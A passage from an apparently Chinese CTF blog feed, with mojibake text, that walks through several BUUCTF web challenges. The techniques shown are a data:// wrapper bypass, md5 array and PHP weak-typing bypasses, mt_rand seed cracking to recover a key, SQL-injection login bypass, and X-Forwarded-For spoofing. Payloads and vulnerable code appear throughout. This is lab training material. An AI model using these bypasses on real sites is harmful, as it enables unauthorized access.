title="é€†æ–¹å‘è„šæœ¬"></a>é€†æ–¹å‘è„šæœ¬</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re &#x3D; &#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag &#x3D; unchange(&#39;flag.php&#39;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">&#x2F;&#x2F;ZmpdYSZmXGI&#x3D;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼šZmpdYSZmXGI=</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission! Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br></pre></td></tr></table></figure><p>ipæˆ‘ä»¬å·²ç»æ·»åŠ äº†</p><h4 id="dataä¼ªåè®®"><a href="#dataä¼ªåè®®" class="headerlink" title="dataä¼ªåè®®"></a>dataä¼ªåè®®</h4><p>ä¼ å…¥å‚æ•°2333ç”¨ä¼ªåè®®ç»•è¿‡ï¼Œ?2333=data://text/plain,todat is a happy day</p><p>è¿™é‡Œæœ‰çš„å¸ˆå‚…ç‰¹æ„ç”¨äº†base64ç»•è¿‡ï¼šdata://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p><p>fileä¼ å…¥æˆ‘ä»¬å°šä¹¦è„šæœ¬è·‘å‡ºçš„æ•°æ®ï¼šfile=ZmpdYSZmXGI=</p><p>åˆ°è¿™é‡Œå°å¿ƒä¸€ä¸ªå‘ï¼Œå°±æ˜¯ä¸ç”¨å†postä¼ å‚äº†ï¼š</p><p>ä¸ç„¶ä¼šè¢«highlight_fileå‡½æ•°æˆªæ–­</p><p>ç„¶åä¸€é”®flagå•¦</p><p><img src="/2021/09/28/buu/24/image-20210928195347754.png" alt="image-20210928195347754"></p><p><img src="/2021/09/28/buu/24/image-20210928195408850.png" alt="image-20210928195408850"></p><h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h2><p>æ¯”è¾ƒç®€å•çš„ä»£ç å®¡è®¡é¢˜</p><p><img src="/2021/09/28/buu/24/image-20210929155243165.png" alt="image-20210929155243165"></p><p>æ•´ç†ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>å¼€å¤´çœ‹åˆ°ååˆ†ç†Ÿæ‚‰çš„include</p><p>å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªé¡µé¢å¯ä»¥æ‰“å°å‡ºå’Œflag.phpé‡Œä¸€æ ·çš„å˜é‡å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br></pre></td></tr></table></figure><h4 id="MD5å€¼ç›¸åŒçš„å˜é‡"><a href="#MD5å€¼ç›¸åŒçš„å˜é‡" class="headerlink" title="MD5å€¼ç›¸åŒçš„å˜é‡"></a>MD5å€¼ç›¸åŒçš„å˜é‡</h4><p>ç¬¬ä¸€å±‚ï¼Œè¦æ±‚GETä¼ å…¥å˜é‡ggå’Œidï¼Œä¸¤ä¸ªå˜é‡çš„å€¼ä¸åŒä½†æ˜¯md5å€¼è¦ç›¸åŒ</p><p>è‡ªç„¶æƒ³åˆ°æ•°ç»„ç»•è¿‡ï¼ˆä¹Ÿå¯ä»¥å»æ‰¾0eå¼€å¤´MD5ç›¸åŒçš„ä¸€ç»„å€¼ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gg[]&#x3D;1&amp;id[]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929155726680.png" alt="image-20210929155726680"></p><p>çœ‹ç¬¬äºŒä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><h4 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h4><p>è¿™é‡Œè€ƒå¯Ÿäº†phpå¼±ç±»å‹çš„çŸ¥è¯†</p><p>å½“ä¼ å…¥å­—ç¬¦ä¸²æ—¶ï¼Œ==ä¼šå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—å†è¿›è¡Œæ¯”è¾ƒ</p><p>æ‰€ä»¥POSTä¼ å‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929160016795.png" alt="image-20210929160016795"></p><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p><img src="/2021/09/28/buu/24/image-20210929161638378.png" alt="image-20210929161638378"></p><p>å¼€å¹•é›·å‡»ï¼Œdoge</p><p>å“ˆå“ˆå…¶å®æ˜¯æˆ‘å­¦çˆ¬è™«çš„è§†é¢‘ä»‹ç»ç½‘ç«™æ¨¡æ¿çš„æ—¶å€™å°±æ˜¯è·Ÿè¿™ä¸ªåŒä¸€å®¶ï¼Œå¾ˆäº²åˆ‡</p><p>å‘ç°é¡µé¢ä¸å¤ªå‹å¥½ï¼Œæ²¡æœ‰ä»»ä½•æç¤º</p><h4 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h4><p>dirsearchæ‰«ä¸€ä¸‹ï¼Œæœ‰æºç æ³„éœ²ï¼š<a href="http://www.zip/">www.zip</a></p><p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°index.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>ä»£ç é‡Œå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªé¡µé¢ï¼šlogin.html</p><p>è®¿é—®çœ‹ä¸€ä¸‹ï¼š</p><p><img src="/2021/09/28/buu/24/image-20210929161956786.png" alt="image-20210929161956786"></p><p>åˆ†æäº†ä¸€ä¸‹ä»£ç </p><p>ç”¨æˆ·åå’Œå¯†ç ã€ç§é’¥éƒ½ä¸èƒ½ä¸ºç©º</p><p>æŒ‰ç…§ç¬¬ä¸‰æ®µåˆ¤æ–­ï¼Œ</p><p>ç”¨æˆ·åä¸ºcrisprï¼Œå¯†ç é‚£é‡Œå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„å•å¼•å·SQLæ³¨å…¥æ¼æ´</p><p>éš¾çš„å°±æ˜¯ç§é’¥å•Šå•Šå•Š</p><h4 id="ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹"><a href="#ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹" class="headerlink" title="ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹"></a>ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;</span><br><span class="line">    char *str2 &#x3D; &quot;KVQP0LdJKRaV3n9D&quot;; &#x2F;&#x2F;å…¬é’¥</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; strlen(str2) ; i++) &#123;</span><br><span class="line">        for (int j &#x3D; 0; j &lt; strlen(str1) ; j++) &#123;</span><br><span class="line">            if ( str2[i] &#x3D;&#x3D; str1[j] ) &#123;</span><br><span class="line">                printf(&quot;%d %d 0 %d &quot;, j, j, strlen(str1)-1);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929162312335.png" alt="image-20210929162312335"></p><p><img src="/2021/09/28/buu/24/image-20210929162350213.png" alt="image-20210929162350213"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line"></span><br><span class="line">function public_key($length &#x3D; 16) &#123;</span><br><span class="line">    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $public_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;genarate private_key</span><br><span class="line">function private_key($length &#x3D; 12) &#123;</span><br><span class="line">    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $private_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key &#x3D; public_key();</span><br><span class="line">$y1ng &#x3D; private_key();</span><br><span class="line">echo $Public_key . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $y1ng;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç§é’¥ï¼šXuNhoueCDCGc</p><p>æœ‰äº†è¿™ä¸ªï¼Œå˜¿å˜¿å˜¿ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ï¼ˆä¸æ˜¯ï¼‰</p><h4 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h4><p>ä¸‡èƒ½å¯†ç èµ°èµ·</p><p><img src="/2021/09/28/buu/24/image-20210929162457871.png" alt="image-20210929162457871"></p><p>ç™»å½•åï¼š</p><p><img src="/2021/09/28/buu/24/image-20210929162522508.png" alt="image-20210929162522508"></p><h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>å•Šï¼Œè¿™é¢˜æ„Ÿè§‰æœ‰ç‚¹å°æ— è¯­</p><p><img src="/2021/09/28/buu/24/image-20210929163657423.png" alt="image-20210929163657423"></p><p>è¿›å»ä¹‹åå‘ç°è¢«å‡ºé¢˜äººç–¯ç‹‚å˜²è®½</p><p><img src="/2021/09/28/buu/24/image-20210929163738713.png" alt="image-20210929163738713"></p><p>æ‰«è¿™ä¸ªå°±è¢«å˜²è®½è¿˜æƒ³pyï¼Ÿ</p><h4 id="md5å¤±è´¥"><a href="#md5å¤±è´¥" class="headerlink" title="md5å¤±è´¥"></a>md5å¤±è´¥</h4><p>è€è€å®å®å›å»é¡µé¢</p><p><img src="/2021/09/28/buu/24/image-20210929163835193.png" alt="image-20210929163835193"></p><p>æºç é‡Œçœ‹åˆ°è¿™æ®µä»£ç </p><p>æˆ‘è¯•äº†åŠå¤©çš„md5åŠ å¯†ï¼Œç»“æœwpå’Œæˆ‘è¯´è¿™ï¼Œæ˜¯ï¼Œè§£ï¼Œä¸ï¼Œå‡ºï¼Œæ¥ï¼Œçš„ï¼</p><p>ç›´æ¥è®¿é—®/flag.phpå°±å¯ä»¥äº†ï¼ˆä¸äº‰æ°”çš„æ³ªæ°´æµäº†ä¸‹æ¥ï¼‰</p><p><img src="/2021/09/28/buu/24/image-20210929164028325.png" alt="image-20210929164028325"></p><p>ç„¶åå°±æ˜¯è¿™ä¸ªå¸…æ°”çš„è¡¨æƒ…åŒ…</p><p>åˆ°è¿™è¾¹å®Œå…¨æ²¡æœ‰æ€è·¯</p><h4 id="å¤§ä½¬çš„è§£é¢˜"><a href="#å¤§ä½¬çš„è§£é¢˜" class="headerlink" title="å¤§ä½¬çš„è§£é¢˜"></a>å¤§ä½¬çš„è§£é¢˜</h4><p>Y1ngå¤§ä½¬è¯´æ˜¯å»çœ‹jsæ–‡ä»¶</p><p>å‘ç°lib/php-mail-form/validate.jsä¸­çš„ JQuery ä¼šå‘ä¸€ä¸ª POST è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var action &#x3D; $(this).attr(&#39;action&#39;);</span><br><span class="line">    if( ! action ) &#123;</span><br><span class="line">      action &#x3D; &#39;contactform&#x2F;contactform.php&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var this_form &#x3D; $(this);</span><br><span class="line">    this_form.find(&#39;.sent-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.error-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.loading&#39;).slideDown();</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">      type: &quot;POST&quot;,</span><br><span class="line">      url: action,</span><br><span class="line">      data: str,</span><br><span class="line">      success: function(msg) &#123;</span><br><span class="line">        if (msg &#x3D;&#x3D; &#39;OK&#39;) &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.sent-message&#39;).slideDown();</span><br><span class="line">          this_form.find(&quot;input, textarea&quot;).val(&#39;&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.error-message&#39;).slideDown().html(msg);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¯·æ±‚çš„ç›®æ ‡ contactform/contactform.php æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ€€ç–‘å‡ºé¢˜äººå‰æ®µä¸€é”®ç™½å«–çš„æ—¶å€™æ²¡æœ‰ä»”ç»†æ£€æŸ¥ã€‚</p><p>è®¿é—® flag.php å‘Šè¯‰è¿˜æ²¡ä¹°ï¼Œå·²ç»è®°å½•äº†è´­ä¹°è€…çš„ ip</p><p>åˆ†æä»£ç å¯çŸ¥å‰æ®µé‚£ä¸ªæˆæƒç éªŒè¯è‚¯å®šæ˜¯æ— æ•ˆçš„ï¼ˆå°±ç®—éªŒè¯é€šè¿‡åç«¯ä¹Ÿä¸çŸ¥é“ï¼‰ï¼Œæ‰€ä»¥è´­ä¹° flag è‚¯å®šæ˜¯å‡çš„ã€‚å› ä¸ºè®°å½•äº†è´­ä¹°è€…çš„ ipï¼Œæ‰€ä»¥ XFF ä¼ªé€ ä¸€ä¸‹ï¼Œå¾—åˆ° flag</p><p><img src="/2021/09/28/buu/24/image-20210929164307294.png" alt="image-20210929164307294"></p><p><img src="/2021/09/28/buu/24/image-20210929164320367.png" alt="image-20210929164320367"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    å‚è€ƒäº†Y1ngå¤§ä½¬çš„åšå®¢ï¼š&lt;a href=&quot;https://www.gem-love.com/ctf/2184.html&quot;&gt;https://www.gem-love.com/ctf/2184.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;çœŸçš„å†™å¾—å¾ˆæ£’ï¼Œçœ‹ç€ååˆ†èˆ’æœï¼Œè¿˜åœ¨è¯„è®ºåŒºæ</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF hellounser</title>
    <link href="http://daweitech.github.io/2021/09/25/buu/23/"/>
    <id>http://daweitech.github.io/2021/09/25/buu/23/</id>
    <published>2021-09-25T12:02:32.000Z</published>
    <updated>2021-09-26T13:16:27.945Z</updated>
    
